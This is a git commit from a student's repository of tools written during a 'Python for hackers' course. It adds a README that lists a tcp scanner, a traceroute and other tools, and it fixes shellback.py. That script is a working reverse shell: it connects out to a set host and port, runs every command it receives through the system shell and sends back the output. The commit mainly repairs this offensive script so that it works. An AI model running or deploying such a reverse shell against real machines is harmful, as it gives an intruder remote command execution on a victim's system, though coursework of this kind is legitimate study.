b833f9cf9135d8dc5a54ecd1775688f444ba2790
thayller vilela cintra <thayllervilelacintra@yahoo.com.br>
2017-12-15 18:32:21 -0200

    novas ferramentas

---
+++ README.md
@@ -0,0 +1,10 @@
+# ferramentas desenvolvidas durante o curso python para hackers
+
+## Lista das ferramentas criadas:
+
+* [x] tcptraceroute
+* [x] flags
+* [x] tcpscan
+* [x] pyhex
+* [x] shellback
+* [x] simplesocket
--- shellback.py
+++ shellback.py
@@ -1,19 +1,16 @@
 #!/usr/bin/python3
-
 import socket
 import subprocess
 
-host = '127.0.0.1'
-port = 443
-
+HOST = '127.0.0.1'   
+PORT = 443            
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((host,port))
+s.connect((HOST, PORT))
 s.send(b'\nHACK CMD:>>> ')
-s.close
 while 1:
-	data = s.recv(1024)
-	proc = subprocess.Popen(data, shell=true, stdout=subprocess.PIPE, stderr= subprocess.PIPE,stdin=subprocess.PIPE)
-	stdout_value = b'\n' + b'CMD EXECUTED: ' + proc.stdout.read() + proc.stderr.read() + b'\n'
-	s.send(stdout_value)
-	s.send(b'\nHACKED CMD: >>>')
-s.close
+     data = s.recv(1024)
+     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+     stdout_value = b'\n' + b'CMD EXECUTED: ' + proc.stdout.read() +  proc.stderr.read() + b'\n' 
+     s.send(stdout_value)
+     s.send(b'\nHACK CMD:>>> ')
+s.close()
